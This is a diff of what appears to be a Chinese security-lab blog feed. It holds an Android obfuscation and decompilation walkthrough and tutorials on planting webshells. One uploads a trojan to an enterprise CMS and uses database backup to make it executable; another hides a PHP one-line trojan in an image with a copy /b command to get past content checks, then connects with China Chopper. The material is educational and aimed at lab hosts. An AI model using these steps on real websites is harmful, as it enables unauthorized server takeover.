-<p>项目在<a href="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/%E4%B8%AD%E5%A6%82%E6%9E%9C%E5%BC%95%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9jar%E5%8C%85%EF%BC%8C%E9%9C%80%E8%A6%81%E5%9C%A8%E6%B7%B7%E6%B7%86%E7%9A%84%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6%E4%B8%AD%E5%8A%A0%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9jar%E5%8C%85%E5%A3%B0%E6%98%8E%EF%BC%8C%E9%83%A8%E5%88%86%E7%AC%AC%E4%B8%89%E6%96%B9jar%E5%8C%85%E8%99%BD%E7%84%B6%E5%9C%A8%E6%B7%B7%E6%B7%86%E8%84%9A%E6%9C%AC%E4%B8%AD%E8%BF%9B%E8%A1%8C%E4%BA%86%E5%A3%B0%E6%98%8E%EF%BC%8C%E4%BD%86%E6%98%AF%E5%9C%A8%E6%B7%B7%E6%B7%86%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%BB%8F%E5%B8%B8%E4%BC%9A%E5%8F%91%E7%8E%B0%E5%86%85%E9%83%A8%E7%B1%BB%E6%88%96%E8%80%85%E5%BC%95%E7%94%A8%E6%96%87%E4%BB%B6%E6%89%BE%E4%B8%8D%E5%88%B0%E7%9A%84%E7%8E%B0%E8%B1%A1%EF%BC%8C%E8%BF%99%E7%A7%8D%E7%8E%B0%E8%B1%A1%E5%9C%A8android-support-v4.jar%E4%B8%AD%E6%9B%B4%E4%B8%BA%E5%B8%B8%E8%A7%81![image-20211229093615763](https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093615763.png)">https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/中如果引入第三方jar包，需要在混淆的脚本文件中加入第三方jar包声明，部分第三方jar包虽然在混淆脚本中进行了声明，但是在混淆过程中经常会发现内部类或者引用文件找不到的现象，这种现象在android-support-v4.jar中更为常见![image-20211229093615763](https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093615763.png)</a></p>
-<p>在proguard-project.txt添加以下代码</p>
+<ul>
+<li><p>打开Eclipse，依次按照New-Project的顺序点击，然后选择 Android Application Project，新建一个可以执行的工程<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229092846142.png" alt="image-20211229092846142"></p>
+</li>
+<li><p>添加应用名称与项目名称（name为SimpleEdu23,第一个SDK选择API14，其余默认），其他设置默认选择<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229092927117.png" alt="image-20211229092927117"></p>
+</li>
+<li><p>点击next<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093002017.png" alt="image-20211229093002017"></p>
+</li>
+<li><p>选择相应位置，点击next<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093028747.png" alt="image-20211229093028747"></p>
+</li>
+<li><p>选择Blank Activity，点击next<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093051916.png" alt="image-20211229093051916"></p>
+</li>
+<li><p>输入Activity名称等信息，点击finish<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093159974.png" alt="image-20211229093159974"></p>
+</li>
+<li><p>打开android工程的project.properties文件<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093358762.png" alt="image-20211229093358762"></p>
+</li>
+<li><p>在project.properties文件中增加下面一行代码proguard.config=prouard-project.txt<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093451991.png" alt="image-20211229093451991"></p>
+</li>
+<li><p>项目在<a href="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/%E4%B8%AD%E5%A6%82%E6%9E%9C%E5%BC%95%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9jar%E5%8C%85%EF%BC%8C%E9%9C%80%E8%A6%81%E5%9C%A8%E6%B7%B7%E6%B7%86%E7%9A%84%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6%E4%B8%AD%E5%8A%A0%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9jar%E5%8C%85%E5%A3%B0%E6%98%8E%EF%BC%8C%E9%83%A8%E5%88%86%E7%AC%AC%E4%B8%89%E6%96%B9jar%E5%8C%85%E8%99%BD%E7%84%B6%E5%9C%A8%E6%B7%B7%E6%B7%86%E8%84%9A%E6%9C%AC%E4%B8%AD%E8%BF%9B%E8%A1%8C%E4%BA%86%E5%A3%B0%E6%98%8E%EF%BC%8C%E4%BD%86%E6%98%AF%E5%9C%A8%E6%B7%B7%E6%B7%86%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%BB%8F%E5%B8%B8%E4%BC%9A%E5%8F%91%E7%8E%B0%E5%86%85%E9%83%A8%E7%B1%BB%E6%88%96%E8%80%85%E5%BC%95%E7%94%A8%E6%96%87%E4%BB%B6%E6%89%BE%E4%B8%8D%E5%88%B0%E7%9A%84%E7%8E%B0%E8%B1%A1%EF%BC%8C%E8%BF%99%E7%A7%8D%E7%8E%B0%E8%B1%A1%E5%9C%A8android-support-v4.jar%E4%B8%AD%E6%9B%B4%E4%B8%BA%E5%B8%B8%E8%A7%81![image-20211229093615763](https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093615763.png)">https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/中如果引入第三方jar包，需要在混淆的脚本文件中加入第三方jar包声明，部分第三方jar包虽然在混淆脚本中进行了声明，但是在混淆过程中经常会发现内部类或者引用文件找不到的现象，这种现象在android-support-v4.jar中更为常见![image-20211229093615763](https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093615763.png)</a></p>
+</li>
+<li><p>在proguard-project.txt添加以下代码</p>
+</li>
+</ul>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">-libraryjars ./libs/android-support-v4.jar</span><br><span class="line">-downwarn android.support.v4.**</span><br><span class="line">-downwarn **CompatHoneycomb</span><br><span class="line">-downwarn **CompatHoneycombMR2</span><br><span class="line">-downwarn **CompatCreatorHoneycombMR2</span><br><span class="line">-keep <span class="class"><span class="keyword">interface</span> <span class="title">android</span>.<span class="title">support</span>.<span class="title">v4</span>.<span class="title">app</span>.**</span>&#123;*;&#125;</span><br><span class="line">-keep <span class="class"><span class="keyword">class</span> <span class="title">android</span>.<span class="title">support</span>.<span class="title">v4</span>.**</span>&#123;*;&#125;</span><br><span class="line">-keep <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">support</span>.<span class="title">v4</span>.**</span></span><br><span class="line"><span class="class">-<span class="title">keep</span> <span class="title">public</span> <span class="title">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">app</span>.<span class="title">Fragment</span></span></span><br></pre></td></tr></table></figure>
 
-<p>点击file，选择export<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094244824.png" alt="image-20211229094244824"></p>
-<p>选择export android application<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094303845.png" alt="image-20211229094303845"></p>
-<p>点击next<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094340365.png" alt="image-20211229094340365"></p>
-<p>生成证书加密（点击browse选择路径），本实验所有密码为123456<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094428828.png" alt="image-20211229094428828"></p>
-<p>选择Alias并输入密码，点击next<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094501941.png" alt="image-20211229094501941"></p>
-<p>点击browse选择生成的APK保存路径<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094535011.png" alt="image-20211229094535011"></p>
-<p>使用JD-GUI<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095219086.png" alt="image-20211229095219086"></p>
-<p>用解压缩工具解压simpleedu23.apk，得到classes.dex<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095342782.png" alt="image-20211229095342782"></p>
-<p>将classes.dex与dex2jar放在同一目录<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095427029.png" alt="image-20211229095427029"></p>
-<p>Cmd执行指令d2j-dex2jar.bat classes.dex<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095743092.png" alt="image-20211229095743092"></p>
-<p>在dex2jar目录下获得目标程序的源代码<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095802525.png" alt="image-20211229095802525"></p>
-<p>用jd-gui打开jar包，得到反编译后的源代码<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095848546.png" alt="image-20211229095848546"></p>
+<ul>
+<li><p>点击file，选择export<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094244824.png" alt="image-20211229094244824"></p>
+</li>
+<li><p>选择export android application<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094303845.png" alt="image-20211229094303845"></p>
+</li>
+<li><p>点击next<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094340365.png" alt="image-20211229094340365"></p>
+</li>
+<li><p>生成证书加密（点击browse选择路径），本实验所有密码为123456<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094428828.png" alt="image-20211229094428828"></p>
+</li>
+<li><p>选择Alias并输入密码，点击next<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094501941.png" alt="image-20211229094501941"></p>
+</li>
+<li><p>点击browse选择生成的APK保存路径<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094535011.png" alt="image-20211229094535011"></p>
+</li>
+<li><p>使用JD-GUI<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095219086.png" alt="image-20211229095219086"></p>
+</li>
+<li><p>用解压缩工具解压simpleedu23.apk，得到classes.dex<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095342782.png" alt="image-20211229095342782"></p>
+</li>
+<li><p>将classes.dex与dex2jar放在同一目录<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095427029.png" alt="image-20211229095427029"></p>
+</li>
+<li><p>Cmd执行指令d2j-dex2jar.bat classes.dex<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095743092.png" alt="image-20211229095743092"></p>
+</li>
+<li><p>在dex2jar目录下获得目标程序的源代码<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095802525.png" alt="image-20211229095802525"></p>
+</li>
+<li><p>用jd-gui打开jar包，得到反编译后的源代码<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095848546.png" alt="image-20211229095848546"></p>
+</li>
+</ul>
 ]]></content>
       <tags>
         <tag>代码混淆</tag>
       </tags>
   </entry>
   <entry>
-    <title>南方企业内容管理系统漏洞</title>
-    <url>/2021/12/27/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="南方企业内容管理系统漏洞"><a href="#南方企业内容管理系统漏洞" class="headerlink" title="南方企业内容管理系统漏洞"></a>南方企业内容管理系统漏洞</h2><p>目的：</p>
-<ul>
-<li>熟悉南方数据企业网站管理系统</li>
-<li>学习南方数据企业网站管理系统常见渗透手法</li>
-</ul>
-<p>原理：</p>
-<ul>
-<li>数据库备份拿webshell</li>
-</ul>
-<p>过程：</p>
-<ul>
-<li><p>浏览器输入<a href="http://192.168.1.3:8002/admin/Login.asp,%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0![image-20211229083557740](https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083557740.png)">http://192.168.1.3:8002/admin/Login.asp,进入后台![image-20211229083557740](https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083557740.png)</a></p>
-</li>
-<li><p>输入admin和密码123456,进入到后台管理界面<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083647733.png" alt="image-20211229083647733"></p>
-</li>
-<li><p>在荣誉管理选项卡下，选择添加企业荣誉，即可弹出可上传文件页面<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083914421.png" alt="image-20211229083914421"></p>
-</li>
-<li><p>点击浏览上传木马文件，把1.asp修改为1.jpg，点击上传<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084027790.png" alt="image-20211229084027790"></p>
-</li>
-<li><p>得到文件地址UploadFiles/xxxxxxxxxxxxx.jpg<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084137287.png" alt="image-20211229084137287"></p>
-</li>
-<li><p>打开系统管理下的数据库备份，即可进入数据库备份页面，并将刚刚得到的木马文件的路径复制到当前数据库路径，并填写数据库备份名称ok.asp<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084434435.png" alt="image-20211229084434435"></p>
-</li>
-<li><p>点击确定，即可得到数据库备份的路径admin/Databackup/ok.asp.asa<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084504206.png" alt="image-20211229084504206"></p>
-</li>
-<li><p>在火狐浏览器输入<a href="http://192.168.1.3:8002/admin/Databackup/ok.asp,%E5%8D%B3%E5%8F%AF%E8%AE%BF%E9%97%AE%E6%9C%A8%E9%A9%AC%EF%BC%8C%E5%B7%B2%E7%BB%8F%E6%88%90%E5%8A%9F%E6%8B%BF%E5%88%B0webshell%EF%BC%88%E5%AF%86%E7%A0%81%EF%BC%9A123456%EF%BC%89![image-20211229084709207](https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084709207.png)">http://192.168.1.3:8002/admin/Databackup/ok.asp,即可访问木马，已经成功拿到webshell（密码：123456）![image-20211229084709207](https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084709207.png)</a></p>
-</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>南方企业</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>图片木马绕过文件内容检测上传webshell</title>
-    <url>/2021/12/27/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/</url>
-    <content><![CDATA[<h2 id="图片木马绕过文件内容检测上传webshell"><a href="#图片木马绕过文件内容检测上传webshell" class="headerlink" title="图片木马绕过文件内容检测上传webshell"></a>图片木马绕过文件内容检测上传webshell</h2><p>目的：</p>
-<ul>
-<li>理解绕过内容验证上传的原理</li>
-<li>学习绕过内容验证上传的过程</li>
-</ul>
-<p>原理</p>
-<ul>
-<li>一般文件内容验证使用getimagesize()函数检测，会判断文件是否是一个有效的文件图片，如果是，则允许上传，否则的话不允许上传</li>
-<li>本实例就是将一句话木马插入到一个【合法】的图片文件当中，然后用中国菜刀远程连接</li>
-</ul>
-<p>过程：</p>
-<ul>
-<li>打开火狐，进入网址<a href="http://192.168.1.3:8080/up%EF%BC%8C%E8%BF%9B%E5%85%A5%E6%9E%84%E9%80%A0%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0webshell![image-20211228104158522](https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104158522.png)">http://192.168.1.3:8080/up，进入构造图片马绕过上传webshell![image-20211228104158522](https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104158522.png)</a></li>
-<li>选择上传木马，后缀php改为php.jpg</li>
-<li>点击上传，提示错误</li>
-<li><img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104300084.png" alt="image-20211228104300084"></li>
-<li>制作图片马，将要上传的木马与图片一个文件下<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104350818.png" alt="image-20211228104350818"></li>
-<li>打开cmd，进入对应目录<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104423625.png" alt="image-20211228104423625"></li>
-<li>输入copy pic.jpg/b+lubr.php/a PicLubr.jpg，将lubr.php插入到pic.jpg中<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104518932.png" alt="image-20211228104518932"></li>
-<li>在火狐上传PicLubr.jpg，后缀名改为PicLubr.jpg.php，然后上传<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104707308.png" alt="image-20211228104707308"></li>
-<li>输入连接访问木马文件<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104737829.png" alt="image-20211228104737829"></li>
-<li>打开中国菜刀，添加木马连接，输入密码lubr，脚本类型php(eval)</li>
-<li>双击添加的shell，即可访问网站的完整目录<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104832489.png" alt="image-20211228104832489"></li>
-</ul>
-]]></content>
-      <tags>
-        <tag>webshell</tag>
-        <tag>图片木马</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>使用网络抓包进行网络验证破解</title>
-    <url>/2021/12/28/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/</url>
+    <url>/blog/2021/12/28/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/</url>
     <content><![CDATA[<h2 id="使用网络抓包进行网络验证破解"><a href="#使用网络抓包进行网络验证破解" class="headerlink" title="使用网络抓包进行网络验证破解"></a>使用网络抓包进行网络验证破解</h2><p>目的：</p>
 <ul>
 <li>学会使用网络抓包方式分析网络验证方法，破解验证机制</li>
@@ -1015,8 +1056,82 @@
       </tags>
   </entry>
   <entry>
+    <title>南方企业内容管理系统漏洞</title>
+    <url>/blog/2021/12/27/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="南方企业内容管理系统漏洞"><a href="#南方企业内容管理系统漏洞" class="headerlink" title="南方企业内容管理系统漏洞"></a>南方企业内容管理系统漏洞</h2><p>目的：</p>
+<ul>
+<li>熟悉南方数据企业网站管理系统</li>
+<li>学习南方数据企业网站管理系统常见渗透手法</li>
+</ul>
+<p>原理：</p>
+<ul>
+<li>数据库备份拿webshell</li>
+</ul>
+<p>过程：</p>
+<ul>
+<li><p>浏览器输入<a href="http://192.168.1.3:8002/admin/Login.asp,%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0![image-20211229083557740](https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083557740.png)">http://192.168.1.3:8002/admin/Login.asp,进入后台![image-20211229083557740](https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083557740.png)</a></p>
+</li>
+<li><p>输入admin和密码123456,进入到后台管理界面<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083647733.png" alt="image-20211229083647733"></p>
+</li>
+<li><p>在荣誉管理选项卡下，选择添加企业荣誉，即可弹出可上传文件页面<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083914421.png" alt="image-20211229083914421"></p>
+</li>
+<li><p>点击浏览上传木马文件，把1.asp修改为1.jpg，点击上传<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084027790.png" alt="image-20211229084027790"></p>
+</li>
+<li><p>得到文件地址UploadFiles/xxxxxxxxxxxxx.jpg<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084137287.png" alt="image-20211229084137287"></p>
+</li>
+<li><p>打开系统管理下的数据库备份，即可进入数据库备份页面，并将刚刚得到的木马文件的路径复制到当前数据库路径，并填写数据库备份名称ok.asp<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084434435.png" alt="image-20211229084434435"></p>
+</li>
+<li><p>点击确定，即可得到数据库备份的路径admin/Databackup/ok.asp.asa<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084504206.png" alt="image-20211229084504206"></p>
+</li>
+<li><p>在火狐浏览器输入<a href="http://192.168.1.3:8002/admin/Databackup/ok.asp,%E5%8D%B3%E5%8F%AF%E8%AE%BF%E9%97%AE%E6%9C%A8%E9%A9%AC%EF%BC%8C%E5%B7%B2%E7%BB%8F%E6%88%90%E5%8A%9F%E6%8B%BF%E5%88%B0webshell%EF%BC%88%E5%AF%86%E7%A0%81%EF%BC%9A123456%EF%BC%89![image-20211229084709207](https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084709207.png)">http://192.168.1.3:8002/admin/Databackup/ok.asp,即可访问木马，已经成功拿到webshell（密码：123456）![image-20211229084709207](https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084709207.png)</a></p>
+</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>南方企业</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>反弹shell</title>
+    <url>/blog/2022/01/05/%E5%8F%8D%E5%BC%B9shell/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>图片木马绕过文件内容检测上传webshell</title>
